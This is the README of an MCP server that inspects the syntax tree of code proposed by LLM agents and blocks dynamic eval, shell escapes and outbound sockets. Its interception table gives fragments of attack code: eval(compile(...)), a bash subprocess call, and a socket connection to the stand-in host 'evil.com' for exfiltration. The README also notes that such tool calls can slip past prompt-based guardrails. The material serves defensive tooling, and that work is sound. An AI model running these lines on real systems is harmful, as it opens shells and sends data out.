# AW-1 Circuit Breaker

[![Glama Score](https://glama.ai/mcp/servers/MvikManners/aw1-circuit-breaker/badges/score.svg)](https://glama.ai/mcp/servers/MvikManners/aw1-circuit-breaker)

Deterministic AST deconstruction and runtime circuit breaker preventing rogue shell escapes, dynamic eval(), and covert lateral socket egress in autonomous LLM tool calls.

## Installation

```bash
pip install -r requirements.txt
```

## Running the Server

Run directly with Python:
```bash
python mcp_server.py
```

Or via uvx:
```bash
uvx mcp_server.py
```

## MCP Client Configuration

```json
{
  "mcpServers": {
    "aw1-circuit-breaker": {
      "command": "python",
      "args": ["mcp_server.py"]
    }
  }
}
```

## Exploit Interception in Action

AW-1 operates deterministically at the Abstract Syntax Tree (AST) level before code reaches Python's runtime execution frame. Probabilistic prompt-based guardrails fail under encoding obfuscation; AST inspection guarantees deterministic enforcement.

### Interception Matrix

| Attack Vector | Attacker Strategy | LLM Guardrail Result | AW-1 AST Circuit Breaker |
|---|---|---|---|
| **Dynamic Execution** | `eval(compile(...))` | Evades semantic filters | **Tripped (`RESTRICTED_INVOCATION`)** |
| **Shell Escapes** | `subprocess.Popen(['bash', ...])` | Masked as system task | **Tripped (`UNAUTHORIZED_MODULE_IMPORT`)** |
| **Lateral Exfiltration** | `socket.connect(('evil.com', 443))` | Disguised as HTTP fetch | **Tripped (`UNAUTHORIZED_MODULE_IMPORT`)** |

### Run the Showcase

```bash
python examples/exploit_showcase.py
```

## License

Licensed under the Apache License, Version 2.0. See LICENSE for details.
